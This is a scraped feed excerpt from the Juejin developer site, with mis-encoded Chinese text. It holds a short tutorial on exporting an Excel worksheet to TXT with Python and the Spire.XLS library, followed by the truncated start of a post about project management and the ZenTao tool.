itemprop="headline" content="ä» Excel åˆ° TXTï¼šç”¨ Python å’Œ Spire.XLS è½»æ¾å®Œæˆæ•°æ®è½¬æ¢"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-05T09:22:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LSTM97"/> <meta itemprop="url" content="https://juejin.cn/user/2253353867033484"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» Excel åˆ° TXTï¼šç”¨ Python å’Œ Spire.XLS è½»æ¾å®Œæˆæ•°æ®è½¬æ¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2253353867033484/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LSTM97
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:22:24.000Z" title="Thu Feb 05 2026 09:22:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ•°æ®å¤„ç†å’Œåˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œç»å¸¸éœ€è¦å°†ä¸åŒæ ¼å¼çš„æ•°æ®è¿›è¡Œè½¬æ¢ã€‚Excel æ–‡ä»¶æ˜¯æ•°æ®å­˜å‚¨å’Œæ“ä½œä¸­éå¸¸å¸¸è§çš„æ ¼å¼ï¼Œè€Œ TXT æ–‡ä»¶å‡­å€Ÿå…¶ç®€å•çš„æ–‡æœ¬æ ¼å¼ï¼Œå¸¸ç”¨äºæ•°æ®å…±äº«å’Œå¤„ç†ã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ Python å’Œ Spire.XLS åº“å°† Excel å¯¼å‡ºä¸º TXT æ–‡ä»¶ã€‚</p>
<h2 data-id="heading-0">ç¯å¢ƒå‡†å¤‡</h2>
<p>è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿å·²å®‰è£… Spire.XLS for Python åº“ã€‚å¦‚æœå°šæœªå®‰è£…ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p>
<pre><code class="hljs">pipÂ installÂ Spire.XLS
</code></pre>
<p>æ­¤åº“æä¾›äº†ä¸°å¯Œçš„ Excel æ–‡ä»¶å¤„ç†åŠŸèƒ½ï¼Œå¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œè¯»å–ã€ç¼–è¾‘å’Œä¿å­˜æ“ä½œã€‚</p>
<h2 data-id="heading-1">ç¤ºä¾‹ä»£ç </h2>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ä»£ç ï¼Œå±•ç¤ºäº†å¦‚ä½•å°† Excel æ–‡ä»¶å¯¼å‡ºä¸º TXT æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">importÂ os
importÂ sys

<span class="hljs-comment">#Â è·å–å½“å‰æ–‡ä»¶è·¯å¾„</span>
<span class="hljs-attr">curPath</span>Â =Â os.path.abspath(os.path.dirname(__file__))
<span class="hljs-attr">rootPath</span>Â =Â os.path.split(curPath)[<span class="hljs-number">0</span>]
sys.path.append(rootPath)

fromÂ spire.xlsÂ importÂ *
fromÂ spire.xls.commonÂ importÂ *

<span class="hljs-comment">#Â è¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶çš„è·¯å¾„</span>
<span class="hljs-attr">inputFile</span>Â =Â <span class="hljs-string">"Input.xlsx"</span>
<span class="hljs-attr">outputFile</span>Â =Â <span class="hljs-string">"output.txt"</span>

<span class="hljs-comment">#Â åˆ›å»ºWorkbookå¯¹è±¡Â </span>
<span class="hljs-attr">workbook</span>Â =Â Workbook()

<span class="hljs-comment">#Â åŠ è½½ä¸€ä¸ªExcelæ–‡ä»¶</span>
workbook.LoadFromFile(inputFile)

<span class="hljs-comment">#Â è·å–ç¬¬ä¸€å¼ å·¥ä½œè¡¨</span>
<span class="hljs-attr">sheet</span>Â =Â workbook.Worksheets[<span class="hljs-number">0</span>]

<span class="hljs-comment">#Â å°†å·¥ä½œè¡¨ä¿å­˜ä¸ºTXTæ–‡ä»¶</span>
sheet.SaveToFile(outputFile,Â "Â ",Â Encoding.get_UTF8())
workbook.Dispose()
</code></pre>
<h3 data-id="heading-2">ä»£ç è§£æ</h3>
<ol>
<li><strong>ç¯å¢ƒé…ç½®</strong></li>
</ol>
<p>æˆ‘ä»¬é¦–å…ˆå¯¼å…¥å¿…è¦çš„æ¨¡å—ï¼Œä¸ºåç»­æ–‡ä»¶æ“ä½œåšå‡†å¤‡ã€‚é€šè¿‡ <code>os</code> å’Œ <code>sys</code> æ¨¡å—ï¼Œæˆ‘ä»¬è·å–äº†å½“å‰æ–‡ä»¶çš„è·¯å¾„ï¼Œä»¥ä¾¿è¿›è¡Œæ–‡ä»¶å¯¼å…¥å’Œå¯¼å‡ºã€‚</p>
<ol start="2">
<li><strong>åˆ›å»º Workbook å¯¹è±¡</strong></li>
</ol>
<p>ä½¿ç”¨ <code>Workbook()</code> ç±»åˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ä½œç°¿å¯¹è±¡ã€‚è¿™æ˜¯æ“ä½œ Excel æ–‡ä»¶çš„åŸºç¡€ã€‚</p>
<ol start="3">
<li><strong>åŠ è½½ Excel æ–‡ä»¶</strong></li>
</ol>
<p>é€šè¿‡ <code>LoadFromFile</code> æ–¹æ³•ï¼Œæˆ‘ä»¬åŠ è½½äº†æŒ‡å®šçš„ Excel æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæ–‡ä»¶åä¸º "æµ‹è¯•.xlsx"ã€‚</p>
<ol start="4">
<li><strong>è·å–å·¥ä½œè¡¨</strong></li>
</ol>
<p>åœ¨ Excel æ–‡ä»¶ä¸­ï¼Œå¯ä»¥æœ‰å¤šä¸ªå·¥ä½œè¡¨ã€‚è¿™é‡Œæˆ‘ä»¬é€šè¿‡ <code>workbook.Worksheets[0]</code> è·å–ç¬¬ä¸€ä¸ªå·¥ä½œè¡¨ã€‚ç´¢å¼•ä» 0 å¼€å§‹ï¼Œå› æ­¤ <code>[0]</code> è¡¨ç¤ºç¬¬ä¸€å¼ å·¥ä½œè¡¨ã€‚</p>
<ol start="5">
<li><strong>å¯¼å‡ºä¸º TXT æ–‡ä»¶</strong></li>
</ol>
<p>ä½¿ç”¨ <code>SaveToFile</code> æ–¹æ³•å°†å·¥ä½œè¡¨å¯¼å‡ºä¸º TXT æ–‡ä»¶ã€‚åœ¨æ­¤å‚æ•°ä¸­ï¼Œæˆ‘ä»¬è®¾ç½®äº†è¾“å‡ºæ–‡ä»¶åä»¥åŠåˆ—åˆ†éš”ç¬¦ï¼ˆåœ¨è¿™é‡Œä½¿ç”¨ç©ºæ ¼ <code>" "</code>ï¼‰ã€‚åŒæ—¶æˆ‘ä»¬è¿˜æŒ‡å®šäº†æ–‡ä»¶ç¼–ç ä¸º UTF-8ï¼Œç¡®ä¿æ”¯æŒå¤šç§è¯­è¨€å­—ç¬¦çš„æ­£ç¡®æ˜¾ç¤ºã€‚</p>
<ol start="6">
<li><strong>é‡Šæ”¾èµ„æº</strong></li>
</ol>
<p>æœ€åï¼Œä½¿ç”¨ <code>Dispose()</code> æ–¹æ³•é‡Šæ”¾å·¥ä½œç°¿æ‰€å ç”¨çš„èµ„æºï¼Œç¡®ä¿ç¨‹åºçš„ç¨³å®šæ€§ã€‚</p>
<h2 data-id="heading-3">å°ç»“</h2>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œæˆ‘ä»¬æˆåŠŸä½¿ç”¨ Python å°† Excel æ–‡ä»¶å¯¼å‡ºä¸º TXT æ ¼å¼ã€‚Spire.XLS æä¾›äº†ç®€æ´çš„æ–¹æ³•ï¼Œä½¿å¾—æ“ä½œ Excel æ–‡ä»¶å˜å¾—æä¸ºç®€å•ï¼Œå°¤å…¶é€‚åˆäºéœ€è¦æ‰¹é‡å¤„ç†æˆ–è‡ªåŠ¨åŒ–è„šæœ¬çš„åœºæ™¯ã€‚</p>
<p>å¯¹äºæ›´å¤æ‚çš„éœ€æ±‚ï¼Œå¦‚éœ€å¤„ç†å¤šä¸ªå·¥ä½œè¡¨æˆ–å¯¹æ•°æ®è¿›è¡Œæ ¼å¼åŒ–ã€ç­›é€‰ç­‰ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ”¹å–„ä»£ç é€»è¾‘å’Œæ·»åŠ ç›¸åº”åŠŸèƒ½ã€‚æ­¤å¤–ï¼ŒSpire.XLS è¿˜æ”¯æŒå¯¹ Excel æ–‡ä»¶çš„å…¶ä»–çµæ´»æ“ä½œï¼Œå¦‚ä¿®æ”¹å•å…ƒæ ¼å†…å®¹ã€æ·»åŠ å›¾è¡¨ç­‰ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€æ±‚æ›´æ·±å…¥åœ°æ¢ç´¢è¯¥åº“çš„åŠŸèƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¦…é“ç®¡ç†å·¥å…·]]></title>    <link>https://juejin.cn/post/7603185231801434138</link>    <guid>https://juejin.cn/post/7603185231801434138</guid>    <pubDate>2026-02-05T09:34:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603185231801434138" data-draft-id="7602893600252182574" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¦…é“ç®¡ç†å·¥å…·"/> <meta itemprop="keywords" content="å·¥ä½œæµå¼•æ“"/> <meta itemprop="datePublished" content="2026-02-05T09:34:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ªé‡Œçš„ç ´æ°´ç“¶"/> <meta itemprop="url" content="https://juejin.cn/user/4394111849466414"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¦…é“ç®¡ç†å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4394111849466414/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ªé‡Œçš„ç ´æ°´ç“¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:34:18.000Z" title="Thu Feb 05 2026 09:34:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"ğŸ•›";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(2):before{content:"2ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(3):before{content:"3ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(4):before{content:"4ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(5):before{content:"5ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(6):before{content:"6ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(7):before{content:"7ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(8):before{content:"8ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(9):before{content:"9ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(10):before{content:"ğŸ”Ÿ"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"ğŸ”¹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">ä»€ä¹ˆæ˜¯é¡¹ç›®ç®¡ç†</h2>
<p>é¡¹ç›®ç®¡ç†æ˜¯ä¸€ä¸ªå¤æ‚è€Œç»†è‡´çš„è¿‡ç¨‹ï¼Œå®ƒæ¶‰åŠå¯¹è½¯ä»¶é¡¹ç›®è¿›è¡Œå…¨é¢è§„åˆ’ã€æ‰§è¡Œã€ç›‘æ§å’Œæ§åˆ¶ï¼Œä»¥ç¡®ä¿é¡¹ç›®èƒ½å¤ŸæŒ‰ç…§é¢„å®šçš„æ—¶é—´ã€æˆæœ¬å’Œè´¨é‡æ ‡å‡†é¡ºåˆ©å®Œæˆã€‚è¿™ä¸ªè¿‡ç¨‹æ¶µç›–äº†å¤šä¸ªå…³é”®æ–¹é¢ï¼š</p>
<ol>
<li>
<p>é¡¹ç›®è§„åˆ’ï¼š</p>
<ol>
<li>ç¡®å®šé¡¹ç›®çš„ç›®æ ‡ã€èŒƒå›´ã€æ—¶é—´å’Œé¢„ç®—ã€‚</li>
<li>åˆ¶å®šè¯¦ç»†çš„é¡¹ç›®è®¡åˆ’ï¼ŒåŒ…æ‹¬å·¥ä½œåˆ†è§£ç»“æ„ï¼ˆWBSï¼‰ã€èµ„æºåˆ†é…ã€é‡Œç¨‹ç¢‘å’Œå…³é”®è·¯å¾„ã€‚</li>
<li>è¯†åˆ«æ½œåœ¨çš„é£é™©ï¼Œå¹¶åˆ¶å®šç›¸åº”çš„é£é™©åº”å¯¹ç­–ç•¥ã€‚</li>
</ol>
</li>
<li>
<p>å›¢é˜Ÿç»„å»ºä¸ç®¡ç†ï¼š</p>
<ol>
<li>ç»„å»ºä¸€ä¸ªè·¨èŒèƒ½çš„å›¢é˜Ÿï¼ŒåŒ…æ‹¬å¼€å‘äººå‘˜ã€æµ‹è¯•äººå‘˜ã€è®¾è®¡å¸ˆç­‰ã€‚</li>
<li>æ˜ç¡®æ¯ä¸ªå›¢é˜Ÿæˆå‘˜çš„è§’è‰²å’Œè´£ä»»ã€‚</li>
<li>ä¿ƒè¿›å›¢é˜Ÿæ²Ÿé€šï¼Œç¡®ä¿ä¿¡æ¯åœ¨å›¢é˜Ÿå†…éƒ¨æµé€šæ— é˜»ã€‚</li>
</ol>
</li>
<li>
<p>éœ€æ±‚ç®¡ç†ï¼š</p>
<ol>
<li>ä¸å®¢æˆ·æˆ–åˆ©ç›Šç›¸å…³è€…åˆä½œï¼Œæ˜ç¡®å¹¶è®°å½•è½¯ä»¶éœ€æ±‚ã€‚</li>
<li>å¯¹éœ€æ±‚è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Œå¹¶åˆ¶å®šéœ€æ±‚å˜æ›´ç®¡ç†æµç¨‹ã€‚</li>
</ol>
</li>
<li>
<p>è¿›åº¦ä¸è´¨é‡ç®¡ç†ï¼š</p>
<ol>
<li>ä½¿ç”¨æ•æ·å¼€å‘æ–¹æ³•ï¼ˆå¦‚Scrumï¼‰æˆ–ä¼ ç»Ÿé¡¹ç›®ç®¡ç†æ–¹æ³•ï¼ˆå¦‚ç€‘å¸ƒæ¨¡å‹ï¼‰æ¥ç®¡ç†é¡¹ç›®è¿›åº¦ã€‚</li>
<li>å®æ–½è´¨é‡æ§åˆ¶æªæ–½ï¼Œå¦‚ä»£ç å®¡æŸ¥ã€å•å…ƒæµ‹è¯•å’Œé›†æˆæµ‹è¯•ã€‚</li>
</ol>
</li>
<li>
<p>é£é™©ä¸å˜æ›´ç®¡ç†ï¼š</p>
<ol>
<li>å®šæœŸè¯„ä¼°é¡¹ç›®é£é™©ï¼Œå¹¶æ›´æ–°é£é™©åº”å¯¹ç­–ç•¥ã€‚</li>
<li>ç®¡ç†é¡¹ç›®å˜æ›´ï¼Œç¡®ä¿å˜æ›´å¾—åˆ°å¦¥å–„å¤„ç†å¹¶è®°å½•ã€‚</li>
</ol>
</li>
<li>
<p>æ²Ÿé€šä¸æŠ¥å‘Šï¼š</p>
<ol>
<li>å®šæœŸå‘é¡¹ç›®å›¢é˜Ÿã€å®¢æˆ·å’Œå…¶ä»–åˆ©ç›Šç›¸å…³è€…æŠ¥å‘Šé¡¹ç›®è¿›å±•ã€‚</li>
<li>ç¡®ä¿æ‰€æœ‰ç›¸å…³æ–¹éƒ½äº†è§£é¡¹ç›®çš„å½“å‰çŠ¶æ€ã€å·²å®Œæˆçš„å·¥ä½œä»¥åŠæ¥ä¸‹æ¥çš„è®¡åˆ’ã€‚</li>
</ol>
</li>
<li>
